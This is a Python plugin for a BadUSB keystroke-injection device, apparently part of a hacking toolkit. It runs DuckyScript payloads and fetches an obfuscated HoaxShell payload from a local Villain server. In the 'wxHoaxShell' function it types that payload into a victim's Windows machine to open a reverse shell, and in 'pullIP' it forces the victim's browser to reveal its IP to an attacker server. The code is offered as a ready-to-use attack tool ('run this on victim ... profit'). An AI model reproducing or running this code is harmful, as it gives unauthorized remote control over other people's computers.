from time import sleep
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
import os
from core.controlPanel.pManager import pluginManager

# reverse shell stuff
import socket
from core.webserver.https import *
from random import randint
import json
from base64 import b64decode

class vars:

    config = { 
        # you can have this in an external file, aslong as main file gets it in dictionary format
        # this is for your command help n stuff
        "payloads": "run payloads in ./plugins/payloads folder",
        #"pTest": "asdijaweu9ihf78ewrgf79",
        "pypayloads": {
            "pullIP": "get the local ip of a computer by starting an HTTP server, and making the client connect to it through browser",
            "wxHoaxShell": "to use: 1. run modified villain in an ssh session\n2.run this on victim\n3. profit",
        },

        "icons": {
            "pypayloads": "./core/icons/usbfolder.bmp",
            "payloads": "./core/icons/usbfolder.bmp",
            "pullIP": "./core/icons/shell_laptop.bmp",
            "wxHoaxShell": "./core/icons/usbskull.bmp"
        }
    }

    payloadList = {}


def payloads(ipTuple):

    handler = pluginManager(socket.socket(socket.AF_INET, socket.SOCK_STREAM), socket.socket(socket.AF_INET, socket.SOCK_STREAM))

    payloads = os.listdir("./plugins/payloads/")
    for file in payloads:
        with open("./plugins/payloads/{}".format(file), "r") as f:
            vars.payloadList[file] = f.read().strip().split("\n")
        
    

    vars.payloadList["back"] = '0'

    sleep(0.5)

    #a = menu(draw, disp, image, list(vars.payloadList), GPIO, cleanScroll=True, flipperZeroMenu=True)

    handler.send("choose one (has to be the exact string)")
    for x in list(vars.payloadList):
        handler.send(x)
    handler.send("\nexit")

    a = handler.recv()

    if a == "exit":
        handler.exitPlugin()

    usb = BadUSB()


    for ln in vars.payloadList[a]:
        if len(ln) == 0: continue
        if ln[0] == "#": continue

        currIndex = vars.payloadList[a].index(ln)

        # this is painful
        handler.send(
            round(100 - float(
                str( # turn decimal percentage into a string
                    "{:.0%}".format(
                        currIndex/len(
                            vars.payloadList[a] # make decimal percentage
                        )
                    )
                ).replace("%", "") # remove percentage sign
            ) # turn string back into float
            ) # round it up
        ) # set percentage

        line = ln.split(" ")
        base = line[0]
        line.pop(0)

        dsi = DuckyScriptInterpreter(usb)

        if base in dsi.key:
            dsi.key[base](line)

        if base == "PRINT": # print to display
            handler.send(' '.join(line))

    handler.exitPlugin()

def wxHoaxShell(ipTuple):

    handler = pluginManager(socket.socket(socket.AF_INET, socket.SOCK_STREAM), socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    usb = BadUSB() # init usb handler

    #payload = vil.payloadGen("windows", "wlan0", scramble=0)

    payloadSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    payloadSock.settimeout(1)
    try:
        payloadSock.connect(("127.0.0.1", 64901))
    except socket.gaierror:
        handler.send("modified villain isnt running, run it in ssh'd shell; sudo python3 ./core/villain/villain.py")
        return

    payloadSock.sendall(json.dumps({
        "os": "windows",
        "lhost": "wlan0",
        "scramble": "2" #scramble twice
    }))
    r = payloadSock.recv(2048 * 4).decode("utf-8")
    payload = b64decode(r.encode("ascii")).decode("ascii")

    #print(payload)
    handler.send("executing payload")

    usb.write(payload, jitter=False, keyDelay=0, pressDelay=0) # curl our server for tcp shell

    usb.press("ENTER") # run

    sleep(0.5) # wait for cmd to finish

    usb.write("exit") # exit right after, should run in background
    usb.press("ENTER")

    handler.send(100)

    handler.send("finished")

    handler.exitPlugin()

    return

def pullIP(iptuple):

    port = randint(2500,30000)

    #handler = usbRunPercentage(draw,disp,image)
    #Thread(target=handler.start,daemon=True).start()
    #handler.clearText()

    handler = pluginManager(socket.socket(socket.AF_INET, socket.SOCK_STREAM), socket.socket(socket.AF_INET, socket.SOCK_STREAM))

    handler.send("starting fake tcp-http")

    #httpHandler = HTTPServer(port=port) # init the http server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.connect(("1.1.1.1", 80)) # make socket and connect to 1.1.1.1 to get local ip
    local = sock.getsockname()[0] # pull local ip from sockname
    sock.close() # close the socket

    #httpHandler.forever() # start it
    #Thread(target=httpHandler.forever, daemon=True).start() # start it

    fakeHTTP = FakeHTTPServer(bindto=(local, port))

    handler.send("started fake tcp-http")
    handler.send("@{}:{}".format(local,port))
    #handler.send("make sure chrome is open and is focused on the search (1s)")

    try:
        usb = BadUSB()
    except Exception as e:
        handler.send("couldn't open usb")
        handler.exitPlugin()
        fakeHTTP.tcp.close()
        print(e)
        return

    sleep(1)

    try:
        usb.ctrl("t") # new tab auto focuses
        usb.write("http://{}:{}/".format(local,port)) # http url
        sleep(0.25) # lil wait
        usb.press("ENTER") # enter
    except:
        handler.send("couldn't type")
        handler.exitPlugin()
        fakeHTTP.tcp.close()
        return

    handler.send("waiting... (5s timeout)")
    sleep(0.5) # lil wait

    try:
        client = fakeHTTP.waitFor()[1][1]
        handler.text = "I:{}\nP:{}".format(client[0], client[1]) # best formatting ever
    except Exception as e:
        print(e)
        handler.send(str(e))

    usb.ctrl("w") # close tab
    sleep(0.25) # wait for host machine to process
    usb.ctrl("w") # twice

    usb.close()
    fakeHTTP.tcp.close()

    sleep(0.125) # button rebound
    handler.send("1:{0}\n2:{1}\n3:{2}\n4:{3}".format(*client[0].split("."))) # best formatting ever 2

    handler.exitPlugin()

def functions():
    """
    put your executable functions here and your configuration
    """
    return vars.config